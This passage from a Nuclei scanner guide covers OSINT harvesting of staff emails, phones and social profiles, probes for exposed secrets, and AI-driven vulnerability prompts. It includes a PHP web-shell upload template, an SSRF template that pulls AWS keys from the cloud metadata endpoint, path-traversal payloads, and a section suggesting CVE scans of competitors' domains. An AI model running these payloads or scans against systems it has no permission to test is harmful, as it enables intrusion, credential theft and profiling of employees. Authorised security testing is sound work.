      - "{{BaseURL}}/staff"
    
    matchers:
      - type: word
        words:
          - "twitter.com"
          - "linkedin.com"
          - "github.com"
          - "facebook.com"
          - "instagram.com"
          - "@"
        condition: or
    
    extractors:
      - type: regex
        regex:
          - 'https?://(?:www\.)?(?:twitter\.com|linkedin\.com|github\.com|facebook\.com|instagram\.com)/[\w\.-]+'
          - '[\w\.-]+@[\w\.-]+\.\w+'
        group: 0

  - method: GET
    path:
      - "{{BaseURL}}/robots.txt"
      - "{{BaseURL}}/sitemap.xml"
    
    extractors:
      - type: regex
        regex:
          - 'https?://[^\s<>"]+(?:linkedin|twitter|github|facebook|instagram)[^\s<>"]*'
```

### 15.4 Metadata and Document Intelligence

```bash
# Document metadata extraction
nuclei -l document_urls.txt -t exposures/files/document-metadata.yaml

# Image metadata analysis
nuclei -l image_galleries.txt -t exposures/files/image-exif.yaml

# PDF document intelligence
nuclei -l pdf_locations.txt -t exposures/files/pdf-metadata.yaml

# Office document exposure
nuclei -l targets.txt -t exposures/files/ -tags office,document,metadata
```

### 15.5 Advanced OSINT Template Development

```yaml
id: comprehensive-osint-reconnaissance

info:
  name: Comprehensive OSINT Reconnaissance
  author: osint-researchers
  severity: info
  description: Multi-vector OSINT data collection and analysis
  tags: osint,reconnaissance,intelligence,profiling

variables:
  osint_paths:
    - "/humans.txt"
    - "/security.txt"
    - "/.well-known/security.txt"
    - "/team.html"
    - "/staff.php"
    - "/about-us"
    - "/company/team"
    - "/our-team"
  
  social_platforms:
    - "twitter.com"
    - "linkedin.com"
    - "github.com"
    - "gitlab.com"
    - "facebook.com"
    - "instagram.com"
    - "youtube.com"
    - "medium.com"

http:
  - method: GET
    path:
      - "{{BaseURL}}{{osint_paths}}"
    
    matchers:
      - type: status
        status:
          - 200
    
    extractors:
      - type: regex
        name: email_addresses
        regex:
          - '[\w\.-]+@[\w\.-]+\.\w+'
        group: 0
      
      - type: regex
        name: phone_numbers
        regex:
          - '\+?[\d\s\-\(\)]{10,}'
        group: 0
      
      - type: regex
        name: social_media
        regex:
          - 'https?://(?:www\.)?(?:{{social_platforms}})/[\w\.-]+'
        group: 0
      
      - type: regex
        name: names_titles
        regex:
          - '(?i)(ceo|cto|ciso|director|manager|developer|engineer|admin|lead)\s*:?\s*([a-zA-Z\s]+)'
        group: 2

  - method: GET
    path:
      - "{{BaseURL}}/robots.txt"
      - "{{BaseURL}}/sitemap.xml"
      - "{{BaseURL}}/crossdomain.xml"
    
    extractors:
      - type: regex
        name: hidden_directories
        regex:
          - 'Disallow:\s*(/[^\s]+)'
        group: 1
      
      - type: regex
        name: sitemap_urls
        regex:
          - '<loc>([^<]+)</loc>'
        group: 1

  - method: GET
    path:
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.env"
      - "{{BaseURL}}/config.json"
      - "{{BaseURL}}/package.json"
    
    matchers:
      - type: word
        words:
          - "repositoryformatversion"
          - "DB_PASSWORD"
          - "API_KEY"
          - "dependencies"
        condition: or
    
    extractors:
      - type: regex
        name: git_repositories
        regex:
          - 'url\s*=\s*([^\s]+)'
        group: 1
      
      - type: regex
        name: api_keys
        regex:
          - '(?i)(api[_-]?key|token|secret)["\s]*[:=]["\s]*([a-zA-Z0-9\-_]+)'
        group: 2
```

### 15.6 Corporate Intelligence Gathering

```bash
# Employee enumeration through exposed directories
nuclei -l corporate_sites.txt -t exposures/files/employee-directory.yaml

# Organizational chart discovery
nuclei -l company_domains.txt -t custom/org-chart-discovery.yaml

# Job posting intelligence
nuclei -l career_pages.txt -t osint/job-posting-analysis.yaml

# Technology stack analysis
nuclei -l corporate_apps.txt -t technologies/ -tags cms,framework,server

# Vendor and partner discovery
nuclei -l company_sites.txt -t osint/vendor-discovery.yaml
```

### 15.7 Infrastructure and Network Intelligence

```yaml
id: infrastructure-intelligence-gathering

info:
  name: Infrastructure Intelligence Gathering
  author: osint-team
  severity: info
  description: Comprehensive infrastructure reconnaissance and mapping
  tags: osint,infrastructure,network,mapping

dns:
  - name: "{{FQDN}}"
    type: A
    class: inet
    
    extractors:
      - type: regex
        name: ip_addresses
        regex:
          - '(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
        group: 1

  - name: "{{FQDN}}"
    type: MX
    class: inet
    
    extractors:
      - type: regex
        name: mail_servers
        regex:
          - 'IN\s+MX\s+\d+\s+([^\s]+)'
        group: 1

  - name: "{{FQDN}}"
    type: NS
    class: inet
    
    extractors:
      - type: regex
        name: name_servers
        regex:
          - 'IN\s+NS\s+([^\s]+)'
        group: 1

  - name: "{{FQDN}}"
    type: TXT
    class: inet
    
    extractors:
      - type: regex
        name: spf_records
        regex:
          - '"v=spf1\s+([^"]+)"'
        group: 1
      
      - type: regex
        name: dmarc_records
        regex:
          - '"v=DMARC1[^"]*"'
        group: 0

http:
  - method: GET
    path:
      - "{{BaseURL}}/.well-known/security.txt"
      - "{{BaseURL}}/security.txt"
    
    matchers:
      - type: status
        status:
          - 200
    
    extractors:
      - type: regex
        name: security_contacts
        regex:
          - 'Contact:\s*([^\r\n]+)'
        group: 1
      
      - type: regex
        name: pgp_keys
        regex:
          - 'Encryption:\s*([^\r\n]+)'
        group: 1
```

### 15.8 Automated OSINT Data Aggregation

```python
# Python script for OSINT data aggregation and analysis
import json
import subprocess
import re
from collections import defaultdict

class OSINTAggregator:
    def __init__(self):
        self.data = defaultdict(list)
        self.targets = []
    
    def run_nuclei_osint(self, target):
        """Execute comprehensive OSINT scan"""
        templates = [
            'exposures/',
            'technologies/',
            'dns/',
            'ssl/',
            'misconfigurations/'
        ]
        
        all_results = []
        for template in templates:
            cmd = [
                'nuclei',
                '-u', target,
                '-t', template,
                '-severity', 'info,low,medium',
                '-json',
                '-silent'
            ]
            
            result = subprocess.run(cmd, capture_output=True, text=True)
            if result.stdout:
                for line in result.stdout.strip().split('\n'):
                    try:
                        all_results.append(json.loads(line))
                    except json.JSONDecodeError:
                        continue
        
        return all_results
    
    def extract_intelligence(self, results):
        """Extract and categorize intelligence from scan results"""
        intelligence = {
            'emails': set(),
            'social_media': set(),
            'technologies': set(),
            'subdomains': set(),
            'ip_addresses': set(),
            'phone_numbers': set(),
            'api_endpoints': set(),
            'sensitive_files': set()
        }
        
        for result in results:
            # Extract emails
            if 'extracted' in result:
                for extraction in result['extracted']:
                    if '@' in extraction:
                        intelligence['emails'].add(extraction)
            
            # Extract technologies
            if result.get('info', {}).get('tags'):
                for tag in result['info']['tags']:
                    if tag in ['apache', 'nginx', 'php', 'python', 'java', 'nodejs']:
                        intelligence['technologies'].add(tag)
            
            # Extract URLs for further analysis
            matched_at = result.get('matched-at', '')
            if matched_at:
                # Extract potential subdomains
                domain_match = re.search(r'https?://([^/]+)', matched_at)
                if domain_match:
                    intelligence['subdomains'].add(domain_match.group(1))
        
        return intelligence
    
    def generate_osint_report(self, target, intelligence):
        """Generate comprehensive OSINT report"""
        report = f"""
# OSINT Intelligence Report for {target}

## Executive Summary
- Total emails discovered: {len(intelligence['emails'])}
- Technologies identified: {len(intelligence['technologies'])}
- Subdomains found: {len(intelligence['subdomains'])}
- IP addresses: {len(intelligence['ip_addresses'])}

## Email Addresses
{chr(10).join(f'- {email}' for email in sorted(intelligence['emails']))}

## Technology Stack
{chr(10).join(f'- {tech}' for tech in sorted(intelligence['technologies']))}

## Subdomains and Infrastructure
{chr(10).join(f'- {sub}' for sub in sorted(intelligence['subdomains']))}

## Social Media Presence
{chr(10).join(f'- {social}' for social in sorted(intelligence['social_media']))}

## Sensitive Exposures
{chr(10).join(f'- {file}' for file in sorted(intelligence['sensitive_files']))}
        """
        
        return report
    
    def comprehensive_osint(self, targets):
        """Execute comprehensive OSINT analysis"""
        all_intelligence = {}
        
        for target in targets:
            print(f"[+] Gathering OSINT for {target}")
            results = self.run_nuclei_osint(target)
            intelligence = self.extract_intelligence(results)
            all_intelligence[target] = intelligence
            
            # Generate individual report
            report = self.generate_osint_report(target, intelligence)
            with open(f'osint_report_{target.replace("://", "_").replace("/", "_")}.md', 'w') as f:
                f.write(report)
        
        return all_intelligence

# Usage example
osint = OSINTAggregator()
targets = ['https://example.com', 'https://api.example.com']
intelligence = osint.comprehensive_osint(targets)
```

### 15.9 OSINT Data Correlation and Analysis

```bash
# Correlate OSINT findings across multiple sources
nuclei -l targets.txt -t exposures/ -json | \
  jq -r '.extracted[]?' | \
  grep -E '@|twitter\.com|linkedin\.com' | \
  sort | uniq > osint_contacts.txt

# Technology fingerprint correlation
nuclei -l targets.txt -t technologies/ -json | \
  jq -r '.info.name' | \
  sort | uniq -c | \
  sort -nr > technology_frequency.txt

# Subdomain aggregation from multiple sources
nuclei -l domains.txt -t dns/ -json | \
  jq -r '.matched-at' | \
  cut -d'/' -f3 | \
  sort | uniq > discovered_subdomains.txt

# Email domain analysis
grep -o '@[^[:space:]]*' osint_contacts.txt | \
  cut -d'@' -f2 | \
  sort | uniq -c | \
  sort -nr > email_domains.txt
```

### 15.10 Integration with External OSINT Tools

```bash
# Combine Nuclei with Subfinder for comprehensive discovery
subfinder -d example.com -o subdomains.txt
nuclei -l subdomains.txt -t exposures/ -t technologies/ -o osint_results.json

# Integration with theHarvester
theHarvester -d example.com -b all -f harvester_results
nuclei -l harvester_emails.txt -t exposures/email-verification.yaml

# Shodan integration for infrastructure mapping
shodan search "org:Example Corp" --format json > shodan_results.json
cat shodan_results.json | jq -r '.ip_str' > shodan_ips.txt
nuclei -l shodan_ips.txt -t network/ -o network_osint.json

# WHOIS data correlation
whois example.com | grep -E "Email|Phone|Name" > whois_contacts.txt
```

### 15.11 Dark Web and Deep Web Reconnaissance

```yaml
id: deep-web-asset-discovery

info:
  name: Deep Web Asset Discovery
  author: osint-team
  severity: info
  description: Discovers potential deep web and hidden assets
  tags: osint,deep-web,hidden,assets

http:
  - method: GET
    path:
      - "{{BaseURL}}/onion"
      - "{{BaseURL}}/.onion"
      - "{{BaseURL}}/tor"
      - "{{BaseURL}}/hidden"
      - "{{BaseURL}}/dark"
    
    matchers:
      - type: word
        words:
          - ".onion"
          - "tor browser"
          - "hidden service"
          - "dark web"
        condition: or
        case-insensitive: true
    
    extractors:
      - type: regex
        regex:
          - '([a-z2-7]{16,56}\.onion)'
        group: 1

  - method: GET
    path:
      - "{{BaseURL}}/robots.txt"
    
    matchers:
      - type: word
        words:
          - "Disallow:"
    
    extractors:
      - type: regex
        name: hidden_paths
        regex:
          - 'Disallow:\s*(/[^\s\r\n]+)'
        group: 1
```

### 15.12 Competitive Intelligence Gathering

```bash
# Competitor technology analysis
nuclei -l competitor_sites.txt -t technologies/ -tags cms,framework -o competitor_tech.json

# Competitor vulnerability assessment
nuclei -l competitor_domains.txt -t cves/ -severity critical,high -o competitor_vulns.json

# Competitor infrastructure mapping
nuclei -l competitor_ips.txt -t network/ -t ssl/ -o competitor_infrastructure.json

# Market positioning analysis
nuclei -l industry_sites.txt -t exposures/apis/ -tags swagger,graphql -o market_apis.json
```

### 15.13 Threat Intelligence Integration

```python
# Threat intelligence correlation with OSINT findings
import requests
import json

class ThreatIntelligence:
    def __init__(self):
        self.ioc_feeds = [
            'https://feodotracker.abuse.ch/downloads/ipblocklist.json',
            'https://urlhaus-api.abuse.ch/v1/urls/recent/',
            'https://threatfox-api.abuse.ch/api/v1/'
        ]
    
    def check_ioc_correlation(self, osint_data):
        """Check OSINT findings against threat intelligence feeds"""
        threats = []
        
        for finding in osint_data:
            ip = self.extract_ip(finding.get('matched-at', ''))
            if ip:
                threat_level = self.check_ip_reputation(ip)
                if threat_level > 0:
                    threats.append({
                        'ip': ip,
                        'threat_level': threat_level,
                        'source': finding.get('template-id'),
                        'url': finding.get('matched-at')
                    })
        
        return threats
    
    def check_ip_reputation(self, ip):
        """Check IP against threat intelligence sources"""
        # Implementation for IP reputation checking
        # Returns threat level (0-10)
        return 0
    
    def extract_ip(self, url):
        """Extract IP address from URL"""
        import re
        ip_pattern = r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
        match = re.search(ip_pattern, url)
        return match.group(0) if match else None

# Usage
threat_intel = ThreatIntelligence()
with open('osint_results.json', 'r') as f:
    osint_data = [json.loads(line) for line in f]

threats = threat_intel.check_ioc_correlation(osint_data)
print(f"Potential threats identified: {len(threats)}")
```
## 16. Legal and Ethical Considerations

All Nuclei scanning activities must be performed within legal and ethical boundaries with proper authorization and scope definition.

### 16.1 Authorization Requirements

**Pre-Engagement Authorization:**
- Written permission from asset owners
- Clearly defined scope of testing targets
- Approved time windows for scanning activities
- Escalation procedures for critical findings
- Data handling and retention policies

**Scope Limitations:**
- IP address ranges and domain specifications
- Excluded systems and sensitive infrastructure
- Rate limiting requirements for production systems
- Specific vulnerability types to test or exclude
- Reporting and communication protocols

### 16.2 Documentation Standards

**Comprehensive Documentation Must Include:**
- Scope of authorization and testing targets
- Scanning methodologies and tools employed
- Timeline of all scanning activities
- Findings classification and risk assessment
- Remediation recommendations and timelines
- Evidence preservation and chain of custody

**Legal Compliance Requirements:**
- GDPR compliance for EU-based targets
- Industry-specific regulations (HIPAA, PCI-DSS, SOX)
- Cross-border data transfer considerations
- Data retention and disposal requirements
- Third-party disclosure obligations

### 16.3 Responsible Disclosure

```markdown
# Vulnerability Disclosure Template

## Executive Summary
- Vulnerability classification and severity
- Affected systems and potential impact
- Recommended immediate actions

## Technical Details
- Vulnerability description and root cause
- Proof of concept and reproduction steps
- Technical impact assessment
- Affected software versions and configurations

## Remediation Guidance
- Immediate mitigation steps
- Long-term remediation strategy
- Validation testing recommendations
- Security control improvements

## Timeline
- Discovery date and methodology
- Initial notification timeline
- Remediation deadline recommendations
- Re-testing and validation schedule
```

## 17. Troubleshooting and Common Issues

Address common operational challenges and provide solutions for typical Nuclei deployment scenarios.

### 17.1 Performance Issues

```bash
# Memory optimization for large target sets
nuclei -l large_targets.txt -stream -bulk-size 10 -rate-limit 50

# DNS resolution optimization
nuclei -l targets.txt -dns-resolver "8.8.8.8,1.1.1.1" -dns-timeout 5

# Connection timeout optimization
nuclei -l targets.txt -timeout 15 -retries 2 -max-host-error 3

# Template loading optimization
nuclei -l targets.txt -t cves/ -exclude-templates dos/ -template-threads 25

# Disk space management
nuclei -l targets.txt -json -o results.json -omit-raw
```

### 17.2 Network Connectivity Issues

```bash
# Proxy troubleshooting
nuclei -u https://example.com -http-proxy http://proxy:8080 -debug

# SSL/TLS certificate issues
nuclei -u https://example.com -insecure -verify-ssl=false

# IPv6 connectivity testing
nuclei -u https://[2001:db8::1] -ip-version 6

# Custom DNS resolution
nuclei -u example.com -dns-resolver 8.8.8.8 -dns-timeout 10

# Connection pooling issues
nuclei -l targets.txt -max-redirects 5 -max-host-error 10
```

### 17.3 Template Development Debugging

```bash
# Template syntax validation
nuclei -t custom-template.yaml -validate

# Template execution debugging
nuclei -u https://example.com -t custom-template.yaml -debug

# Variable substitution testing
nuclei -u https://example.com -t template.yaml -debug-req -debug-resp

# Matcher condition debugging
nuclei -u https://example.com -t template.yaml -verbose

# Performance profiling
nuclei -u https://example.com -t template.yaml -profile-mem
```


## 19. AI-Powered Template Generation and Security Testing

Nuclei integrates artificial intelligence capabilities to automate template creation, enhance vulnerability detection, and provide intelligent security testing workflows. This section covers AI-driven methodologies for rapid template generation and advanced security testing scenarios.

### 19.1 Native AI Template Generation

Nuclei supports generating and running templates on-the-fly using AI capabilities powered by the ProjectDiscovery API:

```bash
# Prerequisites: ProjectDiscovery API key required
export PDCP_API_KEY="your_api_key_here"

# Basic AI-powered vulnerability detection
nuclei -l targets.txt -ai "Detect SQL injection vulnerabilities in login forms"

# Advanced XSS detection with context
nuclei -l targets.txt -ai "Find reflected XSS in search parameters with payload validation"

# SSRF vulnerability identification
nuclei -l targets.txt -ai "Identify SSRF vulnerabilities in URL parameters with internal IP probing"

# Configuration exposure detection
nuclei -l targets.txt -ai "Find exposed .env files containing database credentials and API keys"

# Admin panel discovery
nuclei -l targets.txt -ai "Detect exposed admin panels with default authentication bypass"
```

### 19.2 AI Browser Extension for Real-Time Template Creation

The Nuclei AI Browser Extension enables dynamic template generation from web content:

**Installation and Setup:**
```bash
# Chrome Extension Installation
# 1. Download from GitHub releases
# 2. Enable Developer mode in chrome://extensions
# 3. Load unpacked extension folder
# 4. Login to cloud.projectdiscovery.io

# Keyboard shortcut for AI editor
# Press Ctrl+Shift+O on any webpage to toggle AI editor
```

**HackerOne Integration Example:**
```javascript
// Extract vulnerability details from HackerOne reports
// Right-click on report → "Generate Nuclei Template"
// AI processes the POC and generates YAML template

// Example generated template from H1 report:
id: h1-rce-vulnerability
info:
  name: Remote Code Execution via File Upload
  author: ai-generated
  severity: critical
  description: RCE through unrestricted file upload functionality
  
http:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
    headers:
      Content-Type: "multipart/form-data"
    body: |
      ------WebKitFormBoundary
      Content-Disposition: form-data; name="file"; filename="shell.php"
      Content-Type: application/octet-stream
      
      <?php system($_GET['cmd']); ?>
      ------WebKitFormBoundary--
    
    matchers:
      - type: word
        words:
          - "upload successful"
        condition: and
      - type: status
        status:
          - 200
```

### 19.3 Comprehensive AI Security Testing Workflows

#### 19.3.1 Reconnaissance and Information Gathering

```bash
# Technology stack detection and version enumeration
nuclei -list targets.txt -ai "Extract page title, detect technologies and versions"

# Email and contact information harvesting
nuclei -list targets.txt -ai "Extract email addresses from web pages"

# Subdomain and infrastructure discovery
nuclei -list targets.txt -ai "Extract all subdomains referenced in web pages"

# External resource enumeration
nuclei -list targets.txt -ai "Extract all external resource URLs (CDNs, images, iframes, fonts) from HTML"

# Social media presence mapping
nuclei -list targets.txt -ai "Extract social media profile links from web pages"

# Development environment discovery
nuclei -list targets.txt -ai "Extract links pointing to staging, dev, or beta environments from HTML"

# Document and file discovery
nuclei -list targets.txt -ai "Extract all links pointing to PDF, DOCX, XLSX, and other downloadable documents"

# AI/ML asset discovery
nuclei -list targets.txt -ai "Find exposed AI/ML model files (.pkl, .h5, .pt) that may leak proprietary algorithms or sensitive training data"

# Automation script exposure
nuclei -list targets.txt -ai "Find exposed automation scripts (.sh, .ps1, .bat) revealing internal tooling or credentials"
```

#### 19.3.2 Configuration and Security Misconfiguration Detection

```bash
# Security header analysis
nuclei -list targets.txt -ai "Identify misconfigured CSP headers allowing 'unsafe-inline' or wildcard sources"

# JWT token exposure detection
nuclei -list targets.txt -ai "Detect pages leaking JWT tokens in URLs or cookies"

# Error message analysis
nuclei -list targets.txt -ai "Identify overly verbose error messages revealing framework or library details"

# Source code exposure
nuclei -list targets.txt -ai "Find application endpoints with verbose stack traces or source code exposure"

# Sensitive information in comments
nuclei -list targets.txt -ai "Find sensitive information in HTML comments (debug notes, API keys, credentials)"

# Environment file exposure
nuclei -list targets.txt -ai "Find exposed .env files leaking credentials, API keys, and database passwords"

# Configuration file discovery
nuclei -list targets.txt -ai "Find exposed configuration files containing sensitive information such as credentials, API keys, database passwords, and cloud service secrets"

# Database configuration exposure
nuclei -list targets.txt -ai "Find database configuration files such as database.yml, db_config.php, .pgpass, .my.cnf leaking credentials"

# Container configuration exposure
nuclei -list targets.txt -ai "Find exposed Docker and Kubernetes configuration files such as docker-compose.yml, kubeconfig, .dockercfg, .docker/config.json containing cloud credentials and secrets"

# SSH configuration exposure
nuclei -list targets.txt -ai "Find exposed SSH keys and configuration files such as id_rsa, authorized_keys, and ssh_config"
```

#### 19.3.3 Advanced Web Application Security Testing

```bash
# SQL Injection Detection with AI
nuclei -list katana.jsonl -im jsonl -ai "Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting SQL Injection vulnerabilities with pre-conditions"

# Database error analysis
nuclei -list katana.jsonl -im jsonl -ai "Search for database error responses indicating SQL query issues"

# Parameter-specific SQL injection
nuclei -list katana.jsonl -im jsonl -ai "Find SQL injection in 'id', 'user', 'product', 'category', 'page' parameters"

# Blind SQL injection detection
nuclei -list katana.jsonl -im jsonl -ai "Identify potential blind SQL injection by probing query-related parameters such as search, s, q, query, sort, and filter"

# Time-based SQL injection
nuclei -list katana.jsonl -im jsonl -ai "Use time delay techniques to detect time-based SQLi in all request parameters"

# JSON API SQL injection
nuclei -list katana.jsonl -im jsonl -ai "Probe JSON-based API endpoints for injectable fields susceptible to SQL injection"

# Header-based SQL injection
nuclei -list katana.jsonl -im jsonl -ai "Inject SQL payloads into HTTP headers to detect header-based injection points (e.g. User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host)"
```

#### 19.3.4 Cross-Site Scripting (XSS) Detection

```bash
# Comprehensive XSS detection
nuclei -list katana.jsonl -im jsonl -ai "Fuzz all parameters and HTTP methods using DSL to detect XSS vulnerabilities, including reflected, stored, and DOM-based variants, applying context-aware pre-conditions"

# Reflected XSS testing
nuclei -list katana.jsonl -im jsonl -ai "Test for reflected XSS in user-controllable parameters such as q, search, s, redirect, return, and url by injecting JavaScript payloads and observing output"

# Stored XSS detection
nuclei -list katana.jsonl -im jsonl -ai "Attempt stored XSS injection across all form fields and request parameters, analyzing persistent payload reflections in responses"

# Persistent XSS in user data
nuclei -list katana.jsonl -im jsonl -ai "Identify stored XSS in comment fields, usernames, profile descriptions"

# DOM-based XSS identification
nuclei -list katana.jsonl -im jsonl -ai "Detect DOM-based XSS in JavaScript variables using common sources like location.href, document.URL, and referrer"

# AJAX endpoint XSS testing
nuclei -list katana.jsonl -im jsonl -ai "Fuzz AJAX or dynamic endpoints to identify reflected or stored XSS triggered via asynchronous responses"

# JSON XSS exploitation
nuclei -list katana.jsonl -im jsonl -ai "Inject XSS payloads into JSON fields of API requests and responses to find injection points vulnerable to script execution"
```

#### 19.3.5 Server-Side Request Forgery (SSRF) Detection

```bash
# Comprehensive SSRF detection
nuclei -list katana.jsonl -im jsonl -ai "Perform fuzzing on all HTTP parameters and methods using DSL, focusing on detecting SSRF vulnerabilities with pre-condition checks like internal IP ranges, URL redirects, and response behaviors"

# Parameter-based SSRF testing
nuclei -list katana.jsonl -im jsonl -ai "Detect SSRF in common URL-related parameters like 'url', 'link', 'redirect', 'next', 'feed', and 'callback' by injecting payloads targeting internal services and metadata endpoints"

# Internal IP range testing
nuclei -list katana.jsonl -im jsonl -ai "Detect SSRF by injecting known internal IP ranges such as 127.0.0.1, 169.254.169.254, 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16 and analyzing server responses"

# API endpoint SSRF testing
nuclei -list katana.jsonl -im jsonl -ai "Identify SSRF in API endpoints that fetch external resources, including indirect references such as file uploads, image fetchers, and URL previews"

# Blind SSRF detection
nuclei -list katana.jsonl -im jsonl -ai "Detect blind SSRF by injecting unique external DNS and HTTP callbacks to monitor asynchronous server requests"

# Webhook-based SSRF testing
nuclei -list katana.jsonl -im jsonl -ai "Scan for blind SSRF by injecting webhooks and external DNS resolver payloads"
```

#### 19.3.6 File Inclusion Vulnerability Testing

```bash
# LFI/RFI comprehensive testing
nuclei -list katana.jsonl -im jsonl -ai "Fuzz all HTTP methods and parameters using DSL to detect Local and Remote File Inclusion (LFI/RFI) vulnerabilities, with context-aware pre-conditions"

# Parameter-specific LFI testing
nuclei -list katana.jsonl -im jsonl -ai "Search for LFI in parameters like file, path, template, inc, lang, and page using traversal payloads and file read probes"

# Remote file inclusion testing
nuclei -list katana.jsonl -im jsonl -ai "Test for Remote File Inclusion (RFI) by injecting remote HTTP/HTTPS URLs into parameters such as file and load"

# Directory traversal attacks
nuclei -list katana.jsonl -im jsonl -ai "Identify Local File Inclusion by injecting payloads like /etc/passwd, ../../etc/passwd, php://filter, and php://input into suspect parameters"

# Error-based file inclusion
nuclei -list katana.jsonl -im jsonl -ai "Detect file inclusion vulnerabilities based on verbose error messages or path disclosures revealing local file structure"
```

### 19.4 JavaScript Security Analysis with AI

```bash
# Comprehensive JavaScript security audit
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Analyze JavaScript code for security vulnerabilities (XSS, CSRF, SSRF, RCE, LFI, LFR, etc)"

# Deep JavaScript security analysis
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Perform a full deep JavaScript security audit: API keys, secrets, internal endpoints, debug logs, authentication tokens, and misconfigurations"

# Credential discovery in JavaScript
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find hardcoded API keys, JWT tokens, OAuth credentials, and authentication secrets in JavaScript"

# Cloud credential exposure
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Identify hardcoded cloud service credentials (AWS, GCP, Azure) in JavaScript files"

# API endpoint discovery
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find internal API endpoints (REST, GraphQL, WebSockets) hidden in JavaScript files"

# Payment API key exposure
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Identify exposed payment API keys for Stripe, PayPal, and Square in JavaScript files"

# Database credential exposure
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find Firebase, MongoDB, and Elasticsearch credentials in JavaScript"

# Source map exposure
docker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Find exposed JavaScript source maps (.map files) revealing original source code"
```

### 19.5 Cloud Security Assessment with AI

```bash
# Docker and Kubernetes exposure detection
nuclei -list targets.txt -ai "Scan for open Docker Engine API endpoints that permit remote control or container enumeration"

# Kubernetes API discovery
nuclei -list targets.txt -ai "Identify unauthenticated Kubernetes API servers accessible over the internet"

# Kubernetes Dashboard exposure
nuclei -list targets.txt -ai "Locate publicly accessible Kubernetes Dashboard interfaces with weak or missing authentication"

# Cloud metadata endpoints
nuclei -list targets.txt -ai "Search for cloud provider metadata endpoints (e.g., AWS, Azure, GCP) that respond from web-facing services"

# Cloud storage misconfiguration
nuclei -list targets.txt -ai "Identify exposed S3 buckets, GCP buckets, and Azure blobs with insecure permissions (public read/write or misconfigured ACLs)"

# Cloud credential exposure
nuclei -list targets.txt -ai "Extract AWS access keys or secrets found in HTTP responses with precision filters"

# Azure credential discovery
nuclei -list targets.txt -ai "Extract Azure Storage access keys leaked in HTTP responses, reducing false positives"

# GCP credential detection
nuclei -list targets.txt -ai "Detect Google Cloud credentials exposed in HTTP responses and filter false positives using key structure"

# CI/CD exposure detection
nuclei -list targets.txt -ai "Detect exposed CI/CD configurations (GitHub Actions, GitLab CI, CircleCI) in .yml files"

# Infrastructure as Code exposure
nuclei -list targets.txt -ai "Identify web apps leaking Terraform or CloudFormation configurations"
```

### 19.6 AI Template Development and Customization

```yaml
# AI-Generated Template Example for Advanced SSRF Detection
id: ai-advanced-ssrf-detection

info:
  name: AI-Generated Advanced SSRF Detection
  author: nuclei-ai
  severity: high
  description: AI-powered SSRF detection with multiple attack vectors
  classification:
    cwe-id: CWE-918
  tags: ssrf,ai-generated,server-side

variables:
  internal_ips:
    - "127.0.0.1"
    - "localhost"
    - "169.254.169.254"
    - "10.0.0.1"
    - "192.168.1.1"
    - "172.16.0.1"
  
  ssrf_params:
    - "url"
    - "link"
    - "redirect"
    - "next"
    - "callback"
    - "feed"
    - "src"
    - "path"

http:
  - method: GET
    path:
      - "{{BaseURL}}"
    
    fuzzing:
      - part: query
        type: replace
        mode: multiple
        fuzz:
          - "{{ssrf_params}}={{internal_ips}}"
          - "{{ssrf_params}}=http://{{internal_ips}}"
          - "{{ssrf_params}}=https://{{internal_ips}}"
    
    matchers-condition: or
    matchers:
      - type: word
        words:
          - "IAM role"
          - "security-credentials"
          - "compute metadata"
          - "instance-id"
        condition: or
      
      - type: regex
        regex:
          - "\"AccessKeyId\"\\s*:\\s*\"[A-Z0-9]{16,}\""
          - "\"SecretAccessKey\"\\s*:\\s*\"[A-Za-z0-9/+=]{40}\""
        condition: or
      
      - type: dsl
        dsl:
          - "contains(body, 'private') && contains(body, 'ip')"
          - "contains(body, 'internal') && response_time > 3000"
        condition: or

  - method: POST
    path:
      - "{{BaseURL}}/api/fetch"
      - "{{BaseURL}}/proxy"
      - "{{BaseURL}}/redirect"
    
    headers:
      Content-Type: "application/json"
    
    body: |
      {"url": "http://{{internal_ips}}", "callback": "http://{{internal_ips}}/test"}
    
    attack: batteringram
    threads: 5
    
    matchers:
      - type: status
        status:
          - 200
        condition: and
      - type: word
        words:
          - "successfully"
          - "fetched"
          - "loaded"
        condition: or

# Extractors for intelligence gathering
extractors:
  - type: regex
    name: metadata_endpoints
    regex:
      - "(http://169\\.254\\.169\\.254[^\\s\"']*)"
    group: 1
  
  - type: regex
    name: internal_services
    regex:
      - "(http://(?:127\\.0\\.0\\.1|localhost|10\\.[0-9.]+|192\\.168\\.[0-9.]+|172\\.(?:1[6-9]|2[0-9]|3[01])\\.[0-9.]+):[0-9]+[^\\s\"']*)"
    group: 1
```

### 19.7 AI Prompt Engineering for Security Testing

```python
# Python framework for AI-driven security testing
import subprocess
import json
import time
from typing import List, Dict

class NucleiAITester:
    def __init__(self, api_key: str):
        self.api_key = api_key
        self.setup_environment()
    
    def setup_environment(self):
        """Setup environment variables for AI functionality"""
        import os
        os.environ['PDCP_API_KEY'] = self.api_key
    
    def generate_context_aware_prompts(self, target_type: str, vulnerability_class: str) -> List[str]:
        """Generate context-aware AI prompts based on target and vulnerability type"""
        prompt_templates = {
            'web_app': {
                'xss': [
                    "Fuzz all parameters and HTTP methods using DSL to detect XSS vulnerabilities, including reflected, stored, and DOM-based variants, applying context-aware pre-conditions",
                    "Test for reflected XSS in user-controllable parameters such as q, search, s, redirect, return, and url by injecting JavaScript payloads and observing output",
                    "Identify stored XSS in comment fields, usernames, profile descriptions with persistent payload validation"
                ],
                'sqli': [
                    "Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting SQL Injection vulnerabilities with pre-conditions",
                    "Search for database error responses indicating SQL query issues with error pattern matching",
